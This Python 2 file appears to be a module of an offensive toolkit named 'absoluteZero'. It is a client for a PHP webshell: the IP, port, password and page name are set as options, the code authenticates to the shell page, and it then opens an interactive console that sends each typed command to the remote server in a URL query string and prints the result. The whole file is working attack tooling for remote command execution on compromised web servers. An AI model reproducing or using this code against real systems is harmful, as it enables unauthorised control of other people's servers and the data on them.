import urllib2
import sys
from core.color import color

webshell_ip = '127.0.0.1'
webshell_port = 80
webshell_password = '123456'
webshell_page_name = 'shell.php'


def ShowOptions():
    opts = [('webshell_ip', webshell_ip), ('webshell_port',str(webshell_port)), ('webshell_password', webshell_password), ('webshell_page_name', webshell_page_name)]
    return '\n' + color.ReturnTabulate(opts, ['Option', 'Value'], "simple") + "\n" + '\n'


def SetField(field, value):
    global webshell_ip, webshell_port, webshell_password, webshell_page_name
    if field == "webshell_ip":
        webshell_ip = value
        print color.ReturnInfo('Webshell IP -> ' + webshell_ip)

    elif field == 'webshell_port':
        webshell_port = int(value)
        print color.ReturnInfo('Webshell PORT -> ' + str(webshell_port))

    elif field == 'webshell_password':
        webshell_password = value
        print color.ReturnInfo('Webshell PASSWORD -> ' + webshell_password)

    elif field == 'webshell_page_name':
        webshell_page_name = value
        print color.ReturnInfo('Webshell PAGE NAME -> ' + webshell_page_name)


def Connect():
    try:
        data = "?password=%s" % webshell_password
        command = data + "&command"
        checker = False
        url = 'http://' + webshell_ip + ':' + str(webshell_port) + '/' + webshell_page_name
        print '\n' + color.ReturnInfo('Establishing the connection with the webshell -> %s' % url)
        rec = urllib2.Request(url + data)
        response = urllib2.urlopen(rec)
        check = response.read()
        print color.ReturnInfo('Webshell is online')
        i = len(check)
        f = check.find("$.")
        # print f
        # print i #activate it when you want to customize file length size

        if f == 0:
            print color.ReturnSuccess('Connection succeeded -> %s' % url) + '\n'
            checker = True
            while checker:
                sys.stdout.write(color.ReturnImplantConsole('absoluteZero-PHP'))
                cmd = raw_input('')
                if cmd == "exit":
                    print color.ReturnError('Php session has been closed.')
                    break
                newcmd = cmd.replace(" ", "%20")
                rec2 = urllib2.Request(url + command + "=%s" % newcmd)
                # urlencode=urllib2.unquote(rec2)
                response = urllib2.urlopen(rec2)
                check2 = response.read()
                print("--> " + check2)
        else:
            print color.ReturnError('Invalid password.')
            return
    except Exception, e:
        print color.ReturnError('Error connecting to the webshell -> %s' % str(e))
